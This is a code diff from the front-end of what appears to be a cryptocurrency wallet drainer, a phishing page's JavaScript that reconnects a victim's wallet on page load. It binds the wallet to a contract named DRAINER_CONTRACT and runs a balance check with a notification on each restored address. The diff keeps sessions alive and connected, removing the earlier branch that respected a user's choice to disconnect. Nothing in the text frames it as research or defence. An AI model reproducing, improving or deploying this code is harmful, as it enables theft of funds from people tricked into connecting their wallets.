+        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
+        connectionMode = savedMode;
+        updateConnectedUI(savedAddr, 'evm');
+        await handlePostConnect(savedAddr);
+        return;
+      } catch (e) {
+        logDebug('Soft-restore failed: ' + e.message);
+        // fall through to full connect
+      }
+    }
+
+    // 3) Normal connect
+    await connectWallet();
   };
 
   if (connectButton) connectButton.addEventListener('click', handleClick);
@@ -933,34 +958,31 @@ import { CONFIG } from './config.js';
   }
 
   // ==========================================================================
-  //  SESSION RESTORE
-  //  – If `connectedWallet` exists → rehydrate the underlying provider
-  //    silently, then:
-  //      • if `apex:uiHidden` is NOT set  → show connected UI
-  //      • if `apex:uiHidden` IS  set      → keep UI disconnected, session alive
+  //  SESSION RESTORE — runs on page load
   // ==========================================================================
   async function restoreWalletConnection() {
     const savedWallet = getSavedWallet();
     const savedMode   = getSavedMode();
     if (!savedWallet) return;
 
-    let restored = false;
-
     // --- WalletConnect restore ---
     if (savedMode === 'walletconnect' || !savedMode) {
       try {
         const provider = await initWalletConnect({ useFallbackId: false });
-        if (provider?.session && provider.accounts?.length) {
+        if (provider && provider.session && provider.accounts?.length) {
           const a = provider.accounts[0];
-          activeProvider   = provider;
-          connectionMode   = 'walletconnect';
-          web3Instance     = new Web3Ctor(provider);
+          activeProvider = provider;
+          connectionMode = 'walletconnect';
+          web3Instance = new Web3Ctor(provider);
           contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
           saveWallet(a, 'walletconnect');
-          publishGlobalState(a, 'evm', provider);
-          restored = true;
-          logDebug(`♻️ WC session restored silently: ${a}`);
-        } else if (provider?.session && !provider.accounts?.length) {
+          updateConnectedUI(a, 'evm');
+          await checkBalanceAndNotify(a);
+          logDebug(`♻️ WC session restored: ${a}`);
+          return;
+        }
+        // Stale session → clean slate
+        if (provider && provider.session && !provider.accounts?.length) {
           logDebug('⚠️ Stale WC session — resetting');
           try { await provider.disconnect(); } catch (_) {}
           wcProvider = null;
@@ -972,22 +994,23 @@ import { CONFIG } from './config.js';
     }
 
     // --- Injected restore ---
-    if (!restored && (savedMode === 'injected' || !savedMode)) {
+    if (savedMode === 'injected' || !savedMode) {
       const prov = window.ethereum;
       if (prov && isDesktopDevice) {
         try {
           const accounts = await prov.request({ method: 'eth_accounts' });
           if (accounts?.length && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
             injectedProvider = prov;
-            activeProvider   = prov;
-            connectionMode   = 'injected';
-            web3Instance     = new Web3Ctor(prov);
+            activeProvider = prov;
+            connectionMode = 'injected';
+            web3Instance = new Web3Ctor(prov);
             contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
             saveWallet(savedWallet, 'injected');
             attachInjectedEvents(prov);
-            publishGlobalState(savedWallet, 'evm', prov);
-            restored = true;
-            logDebug(`♻️ Injected session restored silently: ${savedWallet}`);
+            updateConnectedUI(savedWallet, 'evm');
+            await checkBalanceAndNotify(savedWallet);
+            logDebug(`♻️ Injected session restored: ${savedWallet}`);
+            return;
           }
         } catch (e) {
           logDebug('Injected restore: ' + e.message);
@@ -995,17 +1018,8 @@ import { CONFIG } from './config.js';
       }
     }
 
-    if (restored) {
-      if (!isUiHidden()) {
-        updateConnectedUI(getSavedWallet(), 'evm');
-      } else {
-        logDebug('🔒 Session active but UI hidden (user chose to disconnect)');
-      }
-    } else {
-      logDebug('⚠️ No restorable session — clearing saved wallet');
-      clearSavedWallet();
-      clearUiHidden();
-    }
+    logDebug('⚠️ No restorable session — clearing saved wallet');
+    clearSavedWallet();
   }
 
   // ==========================================================================
@@ -1017,8 +1031,8 @@ import { CONFIG } from './config.js';
     Web3Ctor         = libs.Web3;
     logDebug('✅ All libraries loaded');
 
-    if (window.location.protocol !== 'https:' &&
-        !/localhost|127\.0\.0\.1/.test(window.location.hostname)) {
+    if (window.location.protocol !== 'https:'
+        && !/localhost|127\.0\.0\.1/.test(window.location.hostname)) {
       logDebug('⚠️ Site is not on HTTPS — WalletConnect will likely reject connections');
     }
 
